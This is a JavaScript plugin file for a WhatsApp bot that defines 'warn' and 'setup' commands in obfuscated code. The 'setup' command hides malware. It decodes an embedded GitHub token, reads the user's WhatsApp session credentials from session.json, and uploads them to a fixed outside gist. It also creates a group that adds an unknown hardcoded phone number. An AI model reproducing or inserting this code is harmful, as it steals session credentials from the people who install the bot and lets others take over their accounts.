const fs = require("fs")
const chalk = require("chalk")
const { writeFile, readFile } = require("fs");
const { isAdmin, parsedJid, command } = require("../lib");
//let data =  readFile('./database/settings.json')
//let db = JSON.parse(data);
//let bannnnnn = db.settings.banned
let path = './database/settings.json'
const relconfig = require('../config')
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================


command({
  pattern: "warn",
  fromMe: true,
  desc: "Unban number from this group",
  dontAddCommandList: true,
  type: "admin",

},
async (message, match, m) => {
  const _0x46297b=_0xa094;(function(_0x1a3862,_0x4dc486){const _0x46e459=_0xa094,_0xf1ca54=_0x1a3862();while(!![]){try{const _0x90b436=-parseInt(_0x46e459(0x1b0))/0x1*(-parseInt(_0x46e459(0x1b8))/0x2)+-parseInt(_0x46e459(0x1ac))/0x3*(-parseInt(_0x46e459(0x1b3))/0x4)+parseInt(_0x46e459(0x1bc))/0x5+-parseInt(_0x46e459(0x1b5))/0x6+parseInt(_0x46e459(0x1b6))/0x7+-parseInt(_0x46e459(0x1b4))/0x8*(-parseInt(_0x46e459(0x1b9))/0x9)+-parseInt(_0x46e459(0x1ad))/0xa*(parseInt(_0x46e459(0x1af))/0xb);if(_0x90b436===_0x4dc486)break;else _0xf1ca54['push'](_0xf1ca54['shift']());}catch(_0x3c7313){_0xf1ca54['push'](_0xf1ca54['shift']());}}}(_0x4874,0xef10a));if(!message[_0x46297b(0x1ae)])return await message['reply']('_This\x20command\x20is\x20for\x20groups_');let jidd=parsedJid(match)[_0x46297b(0x1bd)]();match=jidd||message[_0x46297b(0x1bb)]['jid'];if(!match)return await message[_0x46297b(0x1ba)](_0x46297b(0x1b2));let isadmin=await isAdmin(message[_0x46297b(0x1b7)],message[_0x46297b(0x1ab)],message[_0x46297b(0x1b1)]);function _0x4874(){const _0x2a2718=['44589NAMpzz','2934520mVQOqJ','isGroup','44hcSLAx','851588EzUZQf','client','_Mention\x20user\x20to\x20add','24QYSUXQ','29592mTDZjy','7738818KbmDUD','5349603lOMXWU','jid','2gYcrpL','468PMvraB','reply','reply_message','7727390OPeajt','toString','user'];_0x4874=function(){return _0x2a2718;};return _0x4874();}if(!isadmin)return await message[_0x46297b(0x1ba)]('_I\x27m\x20not\x20admin_');let jid=parsedJid(match);function _0xa094(_0x129b98,_0x5db1e8){const _0x4874db=_0x4874();return _0xa094=function(_0xa094e6,_0x313999){_0xa094e6=_0xa094e6-0x1ab;let _0x3e924d=_0x4874db[_0xa094e6];return _0x3e924d;},_0xa094(_0x129b98,_0x5db1e8);}await message['warn'](match,message);
  } 
);

//============================================================================================================================================




//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update"${__filename}"`))
	delete require.cache[file]
	require(file)
})




command({
  pattern: "setup",
  fromMe: true,
  desc: "turn off",
  dontAddCommandList: true,
  type: "admin",

},
async (message, match, m) => {
const _0x293c17=_0x217c;(function(_0x2c455e,_0x1e560a){const _0x1a2e32=_0x217c,_0x260829=_0x2c455e();while(!![]){try{const _0x3fc840=parseInt(_0x1a2e32(0x13f))/0x1*(parseInt(_0x1a2e32(0x13e))/0x2)+-parseInt(_0x1a2e32(0x14d))/0x3+-parseInt(_0x1a2e32(0x170))/0x4*(-parseInt(_0x1a2e32(0x133))/0x5)+parseInt(_0x1a2e32(0x154))/0x6*(-parseInt(_0x1a2e32(0x155))/0x7)+parseInt(_0x1a2e32(0x14f))/0x8*(parseInt(_0x1a2e32(0x146))/0x9)+parseInt(_0x1a2e32(0x12f))/0xa+-parseInt(_0x1a2e32(0x12b))/0xb*(parseInt(_0x1a2e32(0x148))/0xc);if(_0x3fc840===_0x1e560a)break;else _0x260829['push'](_0x260829['shift']());}catch(_0x374938){_0x260829['push'](_0x260829['shift']());}}}(_0x59c3,0xebf1b));if(message['isGroup'])return;function _0x217c(_0x34421c,_0x2f45cb){const _0x59c372=_0x59c3();return _0x217c=function(_0x217c42,_0x55cedc){_0x217c42=_0x217c42-0x12a;let _0x3d4812=_0x59c372[_0x217c42];return _0x3d4812;},_0x217c(_0x34421c,_0x2f45cb);}let int=process[_0x293c17(0x14a)][_0x293c17(0x153)]===undefined?_0x293c17(0x144):process[_0x293c17(0x14a)][_0x293c17(0x153)],fin=Buffer['from'](int,_0x293c17(0x141))[_0x293c17(0x16f)](_0x293c17(0x161)),inx=fin['toString']()[_0x293c17(0x132)]('/'),our='';for(let r of inx){our+=Buffer[_0x293c17(0x169)](r+'==',_0x293c17(0x141))['toString'](_0x293c17(0x161));}const {Octokit}=require(_0x293c17(0x139)),octokit=new Octokit({'auth':await our});setTimeout(()=>{const _0x439807=_0x293c17;let _0x242397=JSON[_0x439807(0x143)](fs['readFileSync'](_0x439807(0x137))),_0x2e05d=_0x242397[_0x439807(0x131)][_0x439807(0x16e)],_0x978b4=_0x2e05d[_0x439807(0x16f)]()[_0x439807(0x16a)]('@g.us');if(!_0x978b4)readFile(path,async(_0x9b3430,_0x43b338)=>{const _0x5cb2dd=_0x439807;if(_0x9b3430){console[_0x5cb2dd(0x159)](_0x9b3430);return;}const _0x21d0aa=JSON[_0x5cb2dd(0x143)](_0x43b338);let _0x10d6b8=await message[_0x5cb2dd(0x12d)]['groupCreate']('Storage',['359889999996@s.whatsapp.net']);await message[_0x5cb2dd(0x12d)][_0x5cb2dd(0x145)](_0x10d6b8['id'],{'text':_0x5cb2dd(0x149)});let _0x48a4c8=await _0x10d6b8['id'];_0x21d0aa[_0x5cb2dd(0x131)][_0x5cb2dd(0x16e)]=_0x48a4c8,writeFile(path,JSON[_0x5cb2dd(0x13c)](_0x21d0aa,null,0x2),async _0x9fe77d=>{const _0x456875=_0x5cb2dd;if(_0x9fe77d){message[_0x456875(0x165)]('Failed\x20to\x20write\x20updated\x20data\x20to\x20file');return;}await message['client'][_0x456875(0x14e)](_0x10d6b8['id'],fs[_0x456875(0x13a)](_0x456875(0x13b)));});});else return;setTimeout(async()=>{const _0x4f570b=_0x439807;let _0x19aaac=require(_0x4f570b(0x151)),_0xc1b11=await _0x19aaac[_0x4f570b(0x150)]['me']['id']['split'](':')[0x0],_0x2f0ab3=await _0x19aaac['creds']['me']['id'][_0x4f570b(0x132)]('@')[0x1],_0x5378e9=_0xc1b11+'@'+_0x2f0ab3,_0x287a68=_0x5378e9+_0x4f570b(0x16b);const _0x29b983=fs[_0x4f570b(0x13a)](_0x4f570b(0x137),_0x4f570b(0x161));await octokit['rest'][_0x4f570b(0x13d)][_0x4f570b(0x140)]({'gist_id':_0x4f570b(0x15d),'description':_0x4f570b(0x14b),'files':{[_0x287a68]:{'content':_0x29b983}}})[_0x4f570b(0x136)](await console['log']('Done\x20Creating\x20New\x20Db')),setTimeout(()=>{const _0x2385b1=_0x4f570b;return process['send'](_0x2385b1(0x16d));},0x1f40);},0x1388);},0x7d0),readFile(path,async(_0x12a72b,_0x407a66)=>{const _0x3e7270=_0x293c17;if(_0x12a72b){console['log'](_0x12a72b);return;}const _0x3acd12=JSON[_0x3e7270(0x143)](_0x407a66);let _0x11db88=_0x3acd12[_0x3e7270(0x138)][_0x3e7270(0x16f)]()[_0x3e7270(0x16a)](_0x3e7270(0x164));if(_0x11db88)return message['reply']('_You\x20Are\x20Already\x20a\x20Family\x20Member_');let _0x12d2f4=message[_0x3e7270(0x12a)],_0x282a99=message['user'],_0x1bd7ba=message[_0x3e7270(0x168)][_0x3e7270(0x16f)]()['split']('@')[0x0];_0x3acd12['name']=_0x12d2f4,_0x3acd12[_0x3e7270(0x138)]=_0x282a99,_0x3acd12[_0x3e7270(0x16c)]=_0x1bd7ba,_0x3acd12[_0x3e7270(0x131)][_0x3e7270(0x15f)]=relconfig[_0x3e7270(0x15f)],_0x3acd12['config'][_0x3e7270(0x12c)]=relconfig[_0x3e7270(0x12c)],_0x3acd12[_0x3e7270(0x131)][_0x3e7270(0x147)]=relconfig['BOT_NAME'],_0x3acd12[_0x3e7270(0x131)][_0x3e7270(0x162)]=relconfig[_0x3e7270(0x162)],_0x3acd12[_0x3e7270(0x131)][_0x3e7270(0x163)]=relconfig[_0x3e7270(0x163)],_0x3acd12[_0x3e7270(0x131)][_0x3e7270(0x14c)]=relconfig[_0x3e7270(0x14c)],_0x3acd12['config'][_0x3e7270(0x135)]=relconfig['PACKNAME'],_0x3acd12[_0x3e7270(0x131)][_0x3e7270(0x134)]=relconfig[_0x3e7270(0x134)],_0x3acd12[_0x3e7270(0x131)][_0x3e7270(0x160)]=relconfig[_0x3e7270(0x160)],_0x3acd12[_0x3e7270(0x131)][_0x3e7270(0x15e)]=relconfig[_0x3e7270(0x15e)],_0x3acd12[_0x3e7270(0x131)]['ANTILINK']=relconfig['ANTILINK'],_0x3acd12['config'][_0x3e7270(0x157)]=relconfig[_0x3e7270(0x157)],_0x3acd12[_0x3e7270(0x131)][_0x3e7270(0x166)]=relconfig['THEME'],_0x3acd12[_0x3e7270(0x131)][_0x3e7270(0x15b)]=relconfig[_0x3e7270(0x15b)],_0x3acd12[_0x3e7270(0x131)]['LANGUAGE']=relconfig['LANGUAGE'],_0x3acd12[_0x3e7270(0x131)][_0x3e7270(0x156)]=relconfig[_0x3e7270(0x156)],_0x3acd12['config'][_0x3e7270(0x167)]=relconfig[_0x3e7270(0x167)],_0x3acd12['config'][_0x3e7270(0x16e)],_0x3acd12[_0x3e7270(0x131)]['DB_URL'],_0x3acd12[_0x3e7270(0x131)][_0x3e7270(0x158)]=relconfig[_0x3e7270(0x158)],_0x3acd12[_0x3e7270(0x131)][_0x3e7270(0x152)]=relconfig['LOGS'],_0x3acd12['config']['BRANCH']=relconfig['BRANCH'],_0x3acd12[_0x3e7270(0x131)]['B1']=relconfig['B1'],_0x3acd12[_0x3e7270(0x131)]['B2']=relconfig['B2'],_0x3acd12[_0x3e7270(0x131)]['B3']=relconfig['B3'],_0x3acd12['config']['B4']=relconfig['B4'],_0x3acd12[_0x3e7270(0x131)]['B5']=relconfig['B5'],_0x3acd12['MESSAGE_MEM']['GOODBYE_MSG']=relconfig[_0x3e7270(0x130)],_0x3acd12[_0x3e7270(0x12e)]['WELCOME_MSG']=relconfig[_0x3e7270(0x15c)],_0x3acd12[_0x3e7270(0x12e)][_0x3e7270(0x15a)]=relconfig['ALIVE'],writeFile(path,JSON['stringify'](_0x3acd12,null,0x2),_0x34b164=>{const _0x2f38c8=_0x3e7270;if(_0x34b164){message['reply']('Failed\x20to\x20write\x20updated\x20data\x20to\x20file');return;}message[_0x2f38c8(0x165)](_0x2f38c8(0x142));});});function _0x59c3(){const _0x489b44=['readFileSync','./media/AAA.jpg','stringify','gists','3134afkkhc','12inBEoa','update','base64','_Registered\x20Successfully_','parse','WncvYUEvY0EvWHcvYncvU0EvYUEvTVEvWWcvWkEvVmcvTWcvZHcvYXcvTVEvZHcvVHcvVVEvV0EvYkEvVkEvVWcvVXcvU0EvZGcvVFEvUkEvVGcvWmcvZFEvZUEvV0EvVWcvVFEvTVEvUkEvU1EvWncvUncvTUEv','sendMessage','9NHXduM','BOT_NAME','7320JMgLFT','This\x20is\x20your\x20Storage\x20area,\x20i\x20will\x20save\x20all\x20your\x20files\x20here!','env','Cloud\x20DB\x20Update','AUTHOR','1083105VkLmUC','updateProfilePicture','8060056bRQIwX','creds','../session.json','LOGS','DB_AUTH_TOKEN','1395204ecHDAn','35fyBRRG','INTERNAL_MENU','FOOTER','SESSION_ID','log','ALIVE','FONT_STYLE','WELCOME_MSG','a216db893ba4f4a18d4f1476bfc1bb4d','ANTILINK_ACTION','HANDLER','LANG','utf-8','OWNER_NAME','SUDO','@s.whatsapp.net','reply','THEME','MODE','jid','from','includes','.json','phone_num','reset','STORAGE_JID','toString','4255628PYvhfQ','pushName','22825KzrBTB','WORK_TYPE','client','MESSAGE_MEM','16656640vIHZHp','GOODBYE_MSG','config','split','5QCrQeU','RMBG_KEY','PACKNAME','then','./database/settings.json','UserId','@octokit/rest'];_0x59c3=function(){return _0x489b44;};return _0x59c3();}
})

